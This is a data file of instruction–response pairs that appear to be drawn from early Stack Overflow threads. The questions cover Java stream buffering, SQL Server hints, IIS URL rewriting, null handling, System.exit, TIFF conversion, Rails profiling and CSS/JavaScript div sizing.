{"instruction": "I currently use the following function to do a simple HTTP GET.\npublic static String download(String url) throws java.io.IOException {\n    java.io.InputStream s = null;\n    java.io.InputStreamReader r = null;\n    //java.io.BufferedReader b = null;\n    StringBuilder content = new StringBuilder();\n    try {\n        s = (java.io.InputStream)new URL(url).getContent();\n\n        r = new java.io.InputStreamReader(s);\n        //b = new java.io.BufferedReader(r);\n\n        char[] buffer = new char[4*1024];\n        int n = 0;\n        while (n >= 0) {\n            n = r.read(buffer, 0, buffer.length);\n            if (n > 0) {\n                content.append(buffer, 0, n);\n            }\n        }\n    }\n    finally {\n        //if (b != null) b.close();\n        if (r != null) r.close();\n        if (s != null) s.close();\n    }\n    return content.toString();\n}\n\nI see no reason to use the BufferedReader since I am just going to download everything in sequence. Am I right in thinking there is no use for the BufferedReader in this case?", "output": "In this case, I would do as you are doing (use a byte array for buffering and not one of the stream buffers).\nThere are exceptions, though. One place you see buffers (output this time) is in the servlet API. Data isn't written to the underlying stream until flush() is called, allowing you to buffer output but then dump the buffer if an error occurs and write an error page instead. You might buffer input if you needed to reset the stream for rereading using mark(int) and reset(). For example, maybe you'd inspect the file header before deciding on which content handler to pass the stream to.\nUnrelated, but I think you should rewrite your stream handling. This pattern works best to avoid resource leaks:\n    InputStream stream = new FileInputStream(\"in\");\n    try { //no operations between open stream and try block\n        //work\n    } finally { //do nothing but close this one stream in the finally\n        stream.close();\n    }\n\nIf you are opening multiple streams, nest try/finally blocks.\nAnother thing your code is doing is making the assumption that the returned content is encoded in your VM's default character set (though that might be adequate, depending on the use case)."}
{"instruction": "When writing a SQL statement in SQL Server 2005, does the READUNCOMMITTED query hint imply NOLOCK or do I have to specify it manually too?\nSo is:\nWith (NoLock, ReadUnCommitted)\n\nthe same as:\nWith (ReadUnCommitted)", "output": "I think you can say that\nReadUnCommitted has the abilities of NoLock\nHowever you cannot say that\nNoLock has the abilities of ReadUnCommitted"}
{"instruction": "When writing a SQL statement in SQL Server 2005, does the READUNCOMMITTED query hint imply NOLOCK or do I have to specify it manually too?\nSo is:\nWith (NoLock, ReadUnCommitted)\n\nthe same as:\nWith (ReadUnCommitted)", "output": "According to Kalen Delaney...\nThe NOLOCK hint has nothing to do with the index options. The hint tells SQL\nServer not to request locks when doing SELECT operations, so there will be\nno conflict with data that is already locked. The index options just tell\nSQL Server that this level of locking is allowed, when locking is going to\noccur. For example, if ALLOW_ROW_LOCKS was off, the only possible locks\nwould be page or table locks. The index options don't force locks to be\nheld, they just control the possible size of the locks.\nIn answer to the question in your subject, the NOLOCK hint and the\nREADUNCOMMITTED hint are equivalent."}
{"instruction": "Is there some way I can use urls like: \nhttp://www.blog.com/team-spirit/\ninstead of\nhttp://www.blog.com/?p=122\nin a windows hosted PHP server?", "output": "This is how I did it with WordPress on IIS 6.0\nhttp://www.coderjournal.com/2008/02/url-rewriter-reverse-proxy-iis-wordpress/\nHowever it all depends on what version of IIS you are using.  If you are lucky enough to use IIS 7.0 you don't really have to worry about pretty urls because everything is supported out of the box.  However if you are using IIS 6.0 you are going to have to use a rewriter and some rules to force the IISness out of IIS."}
{"instruction": "How is your javaScript code organized? Does it follow patterns like MVC, or something else? \nI've been working on a side project for some time now, and the further I get, the more my webpage has turned into a full-featured application. Right now, I'm sticking with jQuery, however, the logic on the page is growing to a point where some organization, or dare I say it, \"architecture\" is needed. My first approach is \"MVC-ish\":\n\nThe 'model' is a JSON tree that gets extended with helpers\nThe view is the DOM plus classes that tweak it\nThe controller is the object where I connect events handling and kick off view or model manipulation\n\nI'm very interested, however, in how other people have built more substantial javaScript apps. I'm not interested in GWT, or other server-oriented approaches... just in the approach of \"javaScript + <generic web service-y thingy here>\"\nNote: earlier I said javaScript \"is not really OO, not really functional\". This, I think, distracted everyone. Let's put it this way, because javaScript is unique in many ways, and I'm coming from a strongly-typed background, I don't want to force paradigms I know but were developed in very different languages.", "output": "..but Javascript has many facets that are OO.\nConsider this:\nvar Vehicle = jQuery.Class.create({ \n   init: function(name) { this.name = name; } \n});\n\nvar Car = Vehicle.extend({ \n   fillGas: function(){ \n      this.gas = 100; \n   } \n});\n\nI've used this technique to create page-level javascript classes that have their own state, this helps keep it contained (and I often identify areas that I can reuse and put into other classes).\nThis is also especially useful when you have components/server controls that have their own script to execute, but when you might have multiple instances on the same page.  This keeps the state separate."}
{"instruction": "How is your javaScript code organized? Does it follow patterns like MVC, or something else? \nI've been working on a side project for some time now, and the further I get, the more my webpage has turned into a full-featured application. Right now, I'm sticking with jQuery, however, the logic on the page is growing to a point where some organization, or dare I say it, \"architecture\" is needed. My first approach is \"MVC-ish\":\n\nThe 'model' is a JSON tree that gets extended with helpers\nThe view is the DOM plus classes that tweak it\nThe controller is the object where I connect events handling and kick off view or model manipulation\n\nI'm very interested, however, in how other people have built more substantial javaScript apps. I'm not interested in GWT, or other server-oriented approaches... just in the approach of \"javaScript + <generic web service-y thingy here>\"\nNote: earlier I said javaScript \"is not really OO, not really functional\". This, I think, distracted everyone. Let's put it this way, because javaScript is unique in many ways, and I'm coming from a strongly-typed background, I don't want to force paradigms I know but were developed in very different languages.", "output": "Not 100% sure what you mean here, but I will say that after doing ASP.NET for the last 6 years, my web pages are now mostly driven by JavaScript once the basic page rendering is done by the server. I use JSON for everything (have been for about 3 years now) and use MochiKit for my client-side needs.\nBy the way, JavaScript is OO, but since it uses prototypical inheritance, people don't give it credit in that way. I would also argue that it is functional as well, it all depends on how you write it. If you are really interested in functional programming styles, check out MochiKit - you may like it; it leans quite a bit towards the functional programming side of JavaScript."}
{"instruction": "Is there some way I can use urls like: \nhttp://www.blog.com/team-spirit/\ninstead of\nhttp://www.blog.com/?p=122\nin a windows hosted PHP server?", "output": "Isapi Rewrite Filter on CodePlex - actively developed, free (\"DonationWare\"), open source."}
{"instruction": "How do you specify that a foreign key constraint should be a 1:1 relationship in transact sql? Is declaring the column UNIQUE enough? Below is my existing code.!\nCREATE TABLE [dbo].MyTable(\n    [MyTablekey] INT IDENTITY(1,1) NOT FOR REPLICATION NOT NULL,\n    [OtherTableKey] INT NOT NULL UNIQUE\n        CONSTRAINT [FK_MyTable_OtherTable] FOREIGN KEY REFERENCES [dbo].[OtherTable]([OtherTableKey]),\n    ...\n    CONSTRAINT [PK_MyTable] PRIMARY KEY CLUSTERED \n    (\n        [MyTableKey] ASC\n    ) WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]\n) ON [PRIMARY]\nGO", "output": "If there was a true 1:1 relationship, every record in the first table would have a corresponding record in the second table and vice-versa. In that case, you would probably just want to make one table (unless you needed some strange storage optimization).\n\nThis is very incorrect. Let me give you an example. You have a table CLIENT that has a 1:1 relationship with table SALES_OFFICE because, for example, the logic of your system says so. Would you really incorporate the data of SALES_OFFICE into CLIENT table? And if another tables need to relate them selfs with SALES_OFFICE? And what about database normalization best practices and patterns?\n\nA foreign key column with the UNIQUE and NOT NULL constraints that references a UNIQUE, NOT NULL column in another table creates a 1:(0|1) relationship, which is probably what you want.\n\nThe first part of your answer is the right answer, without the second part, unless the data in second table is really a kind of information that belongs to first table and never will be used by other tables."}
{"instruction": "I am in the middle of reading the excellent Clean Code\nOne discussion is regarding passing nulls into a method.\npublic class MetricsCalculator {\n    public double xProjection(Point p1, Point p2) {\n        return (p2.x - p1.x) * 1.5;\n    }\n}\n...\ncalculator.xProjection(null, new Point(12,13));\n\nIt represents different ways of handling this:\npublic double xProjection(Point p1, Point p2) {\n    if (p1 == null || p2 == null) {\n        throw new IllegalArgumentException(\"Invalid argument for xProjection\");\n    }\n    return (p2.x - p1.x) * 1.5;\n}\n\npublic double xProjection(Point p1, Point p2) {\n    assert p1 != null : \"p1 should not be null\";\n    assert p2 != null : \"p2 should not be null\";\n    return (p2.x - p1.x) * 1.5;\n}\n\nI prefer the assertions approach, but I don't like the fact that assertions are turned off by default.\nThe book finally states:\n\nIn most programming languages there is no good way to deal with a null that is passed by a caller accidentally. Because this is the case, the rational approach is to forbid passing null by default.\n\nIt doesn't really go into how you would enforce this restriction?\nDo any of you have strong opinions either way.", "output": "Spec# looks very interesting!\nWhen something like that isn't available, I generally test non-private methods with a run-time null-check, and assertions for internal methods.  Rather than code the null check explicitly in each method, I delegate that to a utilities class with a check null method:\n/**\n * Checks to see if an object is null, and if so \n * generates an IllegalArgumentException with a fitting message.\n * \n * @param o The object to check against null.\n * @param name The name of the object, used to format the exception message\n *\n * @throws IllegalArgumentException if o is null.\n */\npublic static void checkNull(Object o, String name) \n    throws IllegalArgumentException {\n   if (null == o)\n      throw new IllegalArgumentException(name + \" must not be null\");\n}\n\npublic static void checkNull(Object o) throws IllegalArgumentException {\n   checkNull(o, \"object\");\n} \n\n// untested:\npublic static void checkNull(Object... os) throws IllegalArgumentException {\n   for(Object o in os) checkNull(o);  \n}\n\nThen checking turns into:\npublic void someFun(String val1, String val2) throws IllegalArgumentException {\n   ExceptionUtilities.checkNull(val1, \"val1\");\n   ExceptionUtilities.checkNull(val2, \"val2\");\n\n   /** alternatively:\n   ExceptionUtilities.checkNull(val1, val2);\n   **/\n\n   /** ... **/\n}\n\nThat can be added with editor macros, or a code-processing script.\nEdit: The verbose check could be added this way as well, but I think it's significantly easier to automate the addition of a single line."}
{"instruction": "So the controller context depends on some asp.net internals. What are some ways to cleanly mock these up for unit tests? Seems like its very easy to clog up tests with tons of setup when I only need, for example, Request.HttpMethod to return \"GET\".\nI've seen some examples/helpers out on the nets, but some are dated. Figured this would be a good place to keep the latest and greatest.\nI'm using latest version of rhino mocks", "output": "Using MoQ it looks something like this:\nvar request = new Mock<HttpRequestBase>();\nrequest.Expect(r => r.HttpMethod).Returns(\"GET\");\nvar mockHttpContext = new Mock<HttpContextBase>();\nmockHttpContext.Expect(c => c.Request).Returns(request.Object);\nvar controllerContext = new ControllerContext(mockHttpContext.Object\n, new RouteData(), new Mock<ControllerBase>().Object);\n\nI think the Rhino Mocks syntax is similar."}
{"instruction": "I took a look at the \"Beginner's Guide to LINQ\" post here on StackOverflow (http://stackoverflow.com/questions/8050/beginners-guide-to-linq), but had a follow-up question:\nWe're about to ramp up a new project where nearly all of our database op's will be fairly simple data retrievals (there's another segment of the project which already writes the data). Most of our other projects up to this point make use of stored procedures for such things. However, I'd like to leverage LINQ-to-SQL if it makes more sense.\nSo, the question is this: For simple data retrievals, which approach is better, LINQ-to-SQL or stored procs? Any specific pro's or con's?\nThanks.", "output": "LINQ will bloat the procedure cache\nIf an application is using LINQ to SQL and the queries involve the use of strings that can be highly variable in length, the SQL Server procedure cache will become bloated with one version of the query for every possible string length. For example, consider the following very simple queries created against the Person.AddressTypes table in the AdventureWorks2008 database:\nvar p = \n    from n in x.AddressTypes \n    where n.Name == \"Billing\" \n    select n;\n\nvar p = \n    from n in x.AddressTypes \n    where n.Name == \"Main Office\" \n    select n;\n\nIf both of these queries are run, we will see two entries in the SQL Server procedure cache: One bound with an NVARCHAR(7), and the other with an NVARCHAR(11). Now imagine if there were hundreds or thousands of different input strings, all with different lengths. The procedure cache would become unnecessarily filled with all sorts of different plans for the exact same query. \nMore here: https://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=363290"}
{"instruction": "I am in the middle of reading the excellent Clean Code\nOne discussion is regarding passing nulls into a method.\npublic class MetricsCalculator {\n    public double xProjection(Point p1, Point p2) {\n        return (p2.x - p1.x) * 1.5;\n    }\n}\n...\ncalculator.xProjection(null, new Point(12,13));\n\nIt represents different ways of handling this:\npublic double xProjection(Point p1, Point p2) {\n    if (p1 == null || p2 == null) {\n        throw new IllegalArgumentException(\"Invalid argument for xProjection\");\n    }\n    return (p2.x - p1.x) * 1.5;\n}\n\npublic double xProjection(Point p1, Point p2) {\n    assert p1 != null : \"p1 should not be null\";\n    assert p2 != null : \"p2 should not be null\";\n    return (p2.x - p1.x) * 1.5;\n}\n\nI prefer the assertions approach, but I don't like the fact that assertions are turned off by default.\nThe book finally states:\n\nIn most programming languages there is no good way to deal with a null that is passed by a caller accidentally. Because this is the case, the rational approach is to forbid passing null by default.\n\nIt doesn't really go into how you would enforce this restriction?\nDo any of you have strong opinions either way.", "output": "Also not of immediate use, but related to the mention of Spec#... There's a proposal to add \"null-safe types\" to a future version of Java: \"Enhanced null handling - Null-safe types\".\nUnder the proposal, your method would become\npublic class MetricsCalculator {\n    public double xProjection(#Point p1, #Point p2) {\n        return (p2.x - p1.x) * 1.5;\n    }\n}\n\nwhere #Point is the type of non-null references to objects of type Point."}
{"instruction": "How do you specify that a foreign key constraint should be a 1:1 relationship in transact sql? Is declaring the column UNIQUE enough? Below is my existing code.!\nCREATE TABLE [dbo].MyTable(\n    [MyTablekey] INT IDENTITY(1,1) NOT FOR REPLICATION NOT NULL,\n    [OtherTableKey] INT NOT NULL UNIQUE\n        CONSTRAINT [FK_MyTable_OtherTable] FOREIGN KEY REFERENCES [dbo].[OtherTable]([OtherTableKey]),\n    ...\n    CONSTRAINT [PK_MyTable] PRIMARY KEY CLUSTERED \n    (\n        [MyTableKey] ASC\n    ) WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]\n) ON [PRIMARY]\nGO", "output": "@bosnic:\n\nYou have a table CLIENT that has a 1:1 relationship with table SALES_OFFICE because, for example, the logic of your system says so. \n\nWhat your app logic says, and what your data model say are 2 different things. There is nothing wrong with enforcing that relationship with your business logic code, but it has no place in the data model.\n\nWould you really incorporate the data of SALES_OFFICE into CLIENT table? \n\nIf every CLIENT has a unique SALES_OFFICE, and every SALES_OFFICE has a singular, unique CLIENT - then yes, they should be in the same table. We just need a better name. ;)\n\nAnd if another tables need to relate them selfs with SALES_OFFICE? \n\nThere's no reason to. Relate your other tables to CLIENT, since CLIENT has a unique SALES_OFFICE. \n\nAnd what about database normalization best practices and patterns?\n\nThis is normalization.\nTo be fair, SALES_OFFICE and CLIENT is obviously not a 1:1 relationship - it's 1:N. Hopefully, your SALES_OFFICE exists to serve more than 1 client, and will continue to exist (for a while, at least) without any clients.\nA more realistic example is SALES_OFFICE and ZIP_CODE. A SALES_OFFICE must have exactly 1 ZIP_CODE, and 2 SALES_OFFICEs - even if they have an equivalent ZIP_CODE - do not share the instance of a ZIP_CODE (so, changing the ZIP_CODE of 1 does not impact the other). Wouldn't you agree that ZIP_CODE belongs as a column in SALES_OFFICE?"}
{"instruction": "I am in the middle of reading the excellent Clean Code\nOne discussion is regarding passing nulls into a method.\npublic class MetricsCalculator {\n    public double xProjection(Point p1, Point p2) {\n        return (p2.x - p1.x) * 1.5;\n    }\n}\n...\ncalculator.xProjection(null, new Point(12,13));\n\nIt represents different ways of handling this:\npublic double xProjection(Point p1, Point p2) {\n    if (p1 == null || p2 == null) {\n        throw new IllegalArgumentException(\"Invalid argument for xProjection\");\n    }\n    return (p2.x - p1.x) * 1.5;\n}\n\npublic double xProjection(Point p1, Point p2) {\n    assert p1 != null : \"p1 should not be null\";\n    assert p2 != null : \"p2 should not be null\";\n    return (p2.x - p1.x) * 1.5;\n}\n\nI prefer the assertions approach, but I don't like the fact that assertions are turned off by default.\nThe book finally states:\n\nIn most programming languages there is no good way to deal with a null that is passed by a caller accidentally. Because this is the case, the rational approach is to forbid passing null by default.\n\nIt doesn't really go into how you would enforce this restriction?\nDo any of you have strong opinions either way.", "output": "Thwrowing C# ArgumentException, or Java IllegalArgumentException right at the beginning of the method looks to me as the clearest of solutions. \nOne should always be careful with Runtime Exceptions - exceptions that are not declared on the method signature. Since the compiler doesn't enforce you to catch these it's really easy to forget about them. Make sure you have some kind of a \"catch all\" exception handling to prevent the software to halt abruptly. That's the most important part of your user experience."}
{"instruction": "For various reasons calling System.exit is frowned upon when writing Java Applications, so how can I notify the calling process that not everything is going according to plan?\nEdit: The 1 is a standin for any non-zero exit code.", "output": "It's frowned upon for normal exits.  If \"not everything is going according to plan\", then System.exit is fine.\nUpdate:  I should add that I assume your '1' has meaning that is documented somewhere."}
{"instruction": "Recently we got a new server at the office purely for testing purposes. It is set up so that we can access it from any computer. \nHowever today our ip got blocked from one of our other sites saying that our ip has been suspected of having a virus that sends spam emails. we learned this from the cbl http://cbl.abuseat.org/ \nSo of course we turned the server off to stop this. The problem is the server must be on to continue developing our application and to access the database that is installed on it. Our normal admin is on vacation and is unreachable, and the rest of us are idiots(me included) in this area. \nWe believe that the best solution is to remove it from connecting to the internet but still access it on the lan. If that is a valid solution how would this be done or is there a better way? say blocking specified ports or whatever.", "output": "I assume that this server is behind a router? You should be able to block WAN connections to the server on the router and still leave it open to accepting LAN connection. Or you could restrict the IPs that can connect to the server to the development machines on the network."}
{"instruction": "For various reasons calling System.exit is frowned upon when writing Java Applications, so how can I notify the calling process that not everything is going according to plan?\nEdit: The 1 is a standin for any non-zero exit code.", "output": "It can be dangerous / problematic in web servlet environments also. \nThrowing an Exception is generally considered the other alternative."}
{"instruction": "I am in the middle of reading the excellent Clean Code\nOne discussion is regarding passing nulls into a method.\npublic class MetricsCalculator {\n    public double xProjection(Point p1, Point p2) {\n        return (p2.x - p1.x) * 1.5;\n    }\n}\n...\ncalculator.xProjection(null, new Point(12,13));\n\nIt represents different ways of handling this:\npublic double xProjection(Point p1, Point p2) {\n    if (p1 == null || p2 == null) {\n        throw new IllegalArgumentException(\"Invalid argument for xProjection\");\n    }\n    return (p2.x - p1.x) * 1.5;\n}\n\npublic double xProjection(Point p1, Point p2) {\n    assert p1 != null : \"p1 should not be null\";\n    assert p2 != null : \"p2 should not be null\";\n    return (p2.x - p1.x) * 1.5;\n}\n\nI prefer the assertions approach, but I don't like the fact that assertions are turned off by default.\nThe book finally states:\n\nIn most programming languages there is no good way to deal with a null that is passed by a caller accidentally. Because this is the case, the rational approach is to forbid passing null by default.\n\nIt doesn't really go into how you would enforce this restriction?\nDo any of you have strong opinions either way.", "output": "The best way to handle this really would be the use of exceptions. Ultimately, the asserts are going to end up giving a similar experience to the end user but provide no way for the developer calling your code to handle the situation before showing an exception to the end user. Ultimatley, you want to ensure that you test for invalid inputs as early as possible (especially in public facing code) and provide the appropriate exceptions that the calling code can catch."}
{"instruction": "For various reasons calling System.exit is frowned upon when writing Java Applications, so how can I notify the calling process that not everything is going according to plan?\nEdit: The 1 is a standin for any non-zero exit code.", "output": "Our company's policy is that it's OK (even preferred) to call System.exit(-1), but only in init() methods.  I would definitely think twice before calling it during a program's normal flow."}
{"instruction": "For various reasons calling System.exit is frowned upon when writing Java Applications, so how can I notify the calling process that not everything is going according to plan?\nEdit: The 1 is a standin for any non-zero exit code.", "output": "Throwing exceptions is the best way to send information about a certain error up and out of the app.\nA number doesn't tell you as much as:\nException at thread 'main': FileNotFoundException \"The file 'foo' doesn't exist\"\n\n(or something close to that)"}
{"instruction": "How do you turn a Visual Studio build that you'd perform in the IDE into a script that you can run from the command line?", "output": "As of Visual\u00a0Studio\u00a02005, all of the project files (at least for .NET based projects) are actual MSBuild files, so you can call MSBuild on the command line and pass it the project file.\nThe bottom line is that you need to use a \"build scripting language\" like NAnt or MSBuild (there are others, but these are the mainstream ones right now) if you want to have any real control over your build process."}
{"instruction": "I have a byte[] array, the contents of which represent a TIFF file (as in, if I write out these bytes directly to a file using the BinaryWriter object, it forms a perfectly valid TIFF file) and I'm trying to turn it into a System.Drawing.Image object so that I can use it for later manipulation (feeding into a multipage TIFF object)\nThe problem I'm having is that the commonly accepted code for this task:\n    public Image byteArrayToImage(byte[] byteArrayIn)\n    {\n        MemoryStream ms = new MemoryStream(byteArrayIn);\n        Image returnImage = Image.FromStream(ms, true);\n        return returnImage;\n    }\n\ndoesn't work for me. The second line of the above method where it calls the Image.FromStream method dies at runtime, saying\nParameter Not Valid\n\nI believe that the method is choking on the fact that this is a TIFF file but I cannot figure out how to make the FromStream method accept this fact.\nHow do I turn a byte array of a TIFF image into an Image object?\nAlso, like I said the end goal of this is to have a byte array representing a multipage TIFF file, which contains the TIFF files for which I have byte array objects of right now. If there's a much better way to go about doing this, I'm all for it.", "output": "Edit: The assumption below is not correct, I had a chance to fire up my IDE later and tested with and without Write and both populated the MemoryStream correctly.\nI think you need to write to your MemeoryStream first.\nAs if my memory (no pun intended) serves me correctly this:\nMemoryStream ms = new MemoryStream(byteArrayIn);\n\nCreates a memory stream of that size.\nYou then need to write your byte array contents to the memory stream:\nms.Write(byteArrayIn, 0, byteArrayIn.Length);\n\nSee if that fixes it."}
{"instruction": "My license for Whole Tomatoes Visual AssistX is about to expire and I'm not really planning on renewing it.  I use it for spell checking but that's about it.  The refactoring abilities have been a little disappointing.  Before I just jump into Resharper though what are your thoughts on other possible plugins?", "output": "MZ-Tools is really good as well."}
{"instruction": "I am in the middle of reading the excellent Clean Code\nOne discussion is regarding passing nulls into a method.\npublic class MetricsCalculator {\n    public double xProjection(Point p1, Point p2) {\n        return (p2.x - p1.x) * 1.5;\n    }\n}\n...\ncalculator.xProjection(null, new Point(12,13));\n\nIt represents different ways of handling this:\npublic double xProjection(Point p1, Point p2) {\n    if (p1 == null || p2 == null) {\n        throw new IllegalArgumentException(\"Invalid argument for xProjection\");\n    }\n    return (p2.x - p1.x) * 1.5;\n}\n\npublic double xProjection(Point p1, Point p2) {\n    assert p1 != null : \"p1 should not be null\";\n    assert p2 != null : \"p2 should not be null\";\n    return (p2.x - p1.x) * 1.5;\n}\n\nI prefer the assertions approach, but I don't like the fact that assertions are turned off by default.\nThe book finally states:\n\nIn most programming languages there is no good way to deal with a null that is passed by a caller accidentally. Because this is the case, the rational approach is to forbid passing null by default.\n\nIt doesn't really go into how you would enforce this restriction?\nDo any of you have strong opinions either way.", "output": "In most programming languages there is no good way to deal with a null that is passed by a caller accidentally. Because this is the case, the rational approach is to forbid passing null by default.\n\nI found JetBrains' @Nullable and @NotNull annotations approach for dealing with this the most ingenious, so far. It's IDE specific, unfortunately, but really clean and powerful, IMO.\nhttp://www.jetbrains.com/idea/documentation/howto.html \nHaving this (or something similar) as a java standard would be really nice."}
{"instruction": "Is there some way I can use urls like: \nhttp://www.blog.com/team-spirit/\ninstead of\nhttp://www.blog.com/?p=122\nin a windows hosted PHP server?", "output": "We use the free version of ISAPI_Rewrite.  It uses similar syntax to mod_rewrite, so if you're familiar with that you may have an easier time getting started.\nThere used to be a (syntax-compatible) port of mod_rewrite for IIS, but I can't find it now."}
{"instruction": "For various reasons calling System.exit is frowned upon when writing Java Applications, so how can I notify the calling process that not everything is going according to plan?\nEdit: The 1 is a standin for any non-zero exit code.", "output": "I agree with the \"throw an Exception\" crowd. One reason is that calling System.exit makes your code difficult to use if you want other code to be able to use it. For example, if you find out that your class would be useful from a web app, or some kind of message consuming app, it would be nice to allow those containers the opportunity to deal with the failure somehow. A container may want to retry the operation, decide to log and ignore the problem, send an email to an administrator, etc.\nAn exception to this would be your main() method; this could trap the Exception, and call System.exit() with some value that can be recognized by the calling process or shell script."}
{"instruction": "For various reasons calling System.exit is frowned upon when writing Java Applications, so how can I notify the calling process that not everything is going according to plan?\nEdit: The 1 is a standin for any non-zero exit code.", "output": "The use of System.exit is frowned upon when the 'application' is really a sub-application (e.g. servlet, applet) of a larger Java application (server): in this case the System.exit could stop the JVM and hence also all other sub-applications. In this situation, throwing an appropriate exception, which could be caught and handled by the application framework/server is the best option.\nIf the java application is really meant to be run as a standalone application, there is nothing wrong with using System.exit. in this case, setting an exit value is probably the easiest (and also most used) way of communicating failure or success to the parent process."}
{"instruction": "What is the best way to profile a controller action in Ruby on Rails. Currently I am using the brute-force method of throwing in puts Time.now calls between what I think will be a bottleneck. But that feels really, really dirty. There has got to be a better way.", "output": "There's a Railscast on profiling that's well worth watching\nhttp://railscasts.com/episodes/98-request-profiling"}
{"instruction": "What is the best way to profile a controller action in Ruby on Rails. Currently I am using the brute-force method of throwing in puts Time.now calls between what I think will be a bottleneck. But that feels really, really dirty. There has got to be a better way.", "output": "You might want to give the FiveRuns TuneUp service a try, as it's really rather impressive. Disclaimer: I'm not associated with FiveRuns in any way, I've just tried this service out.\nTuneUp is a free service whereby you download a plugin and when you run your application it injects a panel at the top of the screen that can be expanded to display detailed performance metrics.\nIt gives you some nice graphs, including one that shows what proportion of time is spent in the Model, View and Controller. You can even drill right down to see the individual SQL queries that ActiveRecord is executing if you need to and it can show you the underlying database schema with another click.\nFinally, you can optionally upload your profiling data to the FiveRuns site for community performance analysis and advice."}
{"instruction": "In a web application, I have a page that contains a DIV that has an auto-width depending on the width of the browser window.\nI need an auto-height for the object.  The DIV starts about 300px from the top screen, and it's height should make it stretch to the bottom of the browser screen.  I have a max height for the container DIV, so there would have to be minimum-height for the div.  I believe I can just restrict that in CSS, and use Javascript to handle the resizing of the DIV.\nMy javascript isn't nearly as good as it should be.  Is there an easy script I could write that would do this for me?\nEdit: \nThe DIV houses a control that does it's own overflow handling (implements its own scroll bar).", "output": "What should happen in the case of overflow?  If you want it to just get to the bottom of the window, use absolute positioning:\ndiv {\n  position: absolute;\n  top: 300px;\n  bottom: 0px;\n  left: 30px;\n  right: 30px;\n}\n\nThis will put the DIV 30px in from each side, 300px from the top of the screen, and flush with the bottom.  Add an overflow:auto; to handle cases where the content is larger than the div.\n\nEdit: @Whoever marked this down, an explanation would be nice... Is something wrong with the answer?"}
{"instruction": "I have a byte[] array, the contents of which represent a TIFF file (as in, if I write out these bytes directly to a file using the BinaryWriter object, it forms a perfectly valid TIFF file) and I'm trying to turn it into a System.Drawing.Image object so that I can use it for later manipulation (feeding into a multipage TIFF object)\nThe problem I'm having is that the commonly accepted code for this task:\n    public Image byteArrayToImage(byte[] byteArrayIn)\n    {\n        MemoryStream ms = new MemoryStream(byteArrayIn);\n        Image returnImage = Image.FromStream(ms, true);\n        return returnImage;\n    }\n\ndoesn't work for me. The second line of the above method where it calls the Image.FromStream method dies at runtime, saying\nParameter Not Valid\n\nI believe that the method is choking on the fact that this is a TIFF file but I cannot figure out how to make the FromStream method accept this fact.\nHow do I turn a byte array of a TIFF image into an Image object?\nAlso, like I said the end goal of this is to have a byte array representing a multipage TIFF file, which contains the TIFF files for which I have byte array objects of right now. If there's a much better way to go about doing this, I'm all for it.", "output": "OK, I found the issue, and it was from a part of the code unrelated to the part of the code I was asking about. The data was being passed as a string, I was converting it to a byte array (this was a test rig so I was trying to simulate the byte array that I get in the main app), then converting that to a MemoryStream, then making an Image from that.\nWhat I failed to realize was that the string was Base64 encoded. Calling Convert.FromBase64String() caused it to turn into a byte array which wouldn't kill the Image.FromStream() method.\nSo basically it boiled down to a stupid mistake on my part. But hey, the code above is still useful and this page will probably serve as a Google result as to how to avoid this mistake to someone else.\nAlso, I found an easy way to construct a Multi-Page TIFF from my byte arrays here."}
{"instruction": "In a web application, I have a page that contains a DIV that has an auto-width depending on the width of the browser window.\nI need an auto-height for the object.  The DIV starts about 300px from the top screen, and it's height should make it stretch to the bottom of the browser screen.  I have a max height for the container DIV, so there would have to be minimum-height for the div.  I believe I can just restrict that in CSS, and use Javascript to handle the resizing of the DIV.\nMy javascript isn't nearly as good as it should be.  Is there an easy script I could write that would do this for me?\nEdit: \nThe DIV houses a control that does it's own overflow handling (implements its own scroll bar).", "output": "The DIV houses a control that does it's own overflow handling."}
{"instruction": "In a web application, I have a page that contains a DIV that has an auto-width depending on the width of the browser window.\nI need an auto-height for the object.  The DIV starts about 300px from the top screen, and it's height should make it stretch to the bottom of the browser screen.  I have a max height for the container DIV, so there would have to be minimum-height for the div.  I believe I can just restrict that in CSS, and use Javascript to handle the resizing of the DIV.\nMy javascript isn't nearly as good as it should be.  Is there an easy script I could write that would do this for me?\nEdit: \nThe DIV houses a control that does it's own overflow handling (implements its own scroll bar).", "output": "If I understand what you're asking, this should do the trick:\n// the more standards compliant browsers (mozilla/netscape/opera/IE7) use \n// window.innerWidth and window.innerHeight\n\nvar windowHeight;\n\nif (typeof window.innerWidth != 'undefined')\n{\n    windowHeight = window.innerHeight;\n}\n// IE6 in standards compliant mode (i.e. with a valid doctype as the first \n// line in the document)\nelse if (typeof document.documentElement != 'undefined'\n        && typeof document.documentElement.clientWidth != 'undefined' \n        && document.documentElement.clientWidth != 0)\n{\n    windowHeight = document.documentElement.clientHeight;\n}\n// older versions of IE\nelse\n{\n    windowHeight = document.getElementsByTagName('body')[0].clientHeight;\n}\n\ndocument.getElementById(\"yourDiv\").height = windowHeight - 300 + \"px\";"}
{"instruction": "In a web application, I have a page that contains a DIV that has an auto-width depending on the width of the browser window.\nI need an auto-height for the object.  The DIV starts about 300px from the top screen, and it's height should make it stretch to the bottom of the browser screen.  I have a max height for the container DIV, so there would have to be minimum-height for the div.  I believe I can just restrict that in CSS, and use Javascript to handle the resizing of the DIV.\nMy javascript isn't nearly as good as it should be.  Is there an easy script I could write that would do this for me?\nEdit: \nThe DIV houses a control that does it's own overflow handling (implements its own scroll bar).", "output": "document.getElementById('myDiv').style.height = 500;\nThis is the very basic JS code required to adjust the height of your object dynamically.  I just did this very thing where I had some auto height property, but when I add some content via XMLHttpRequest I needed to resize my parent div and this offsetheight property did the trick in IE6/7 and FF3"}
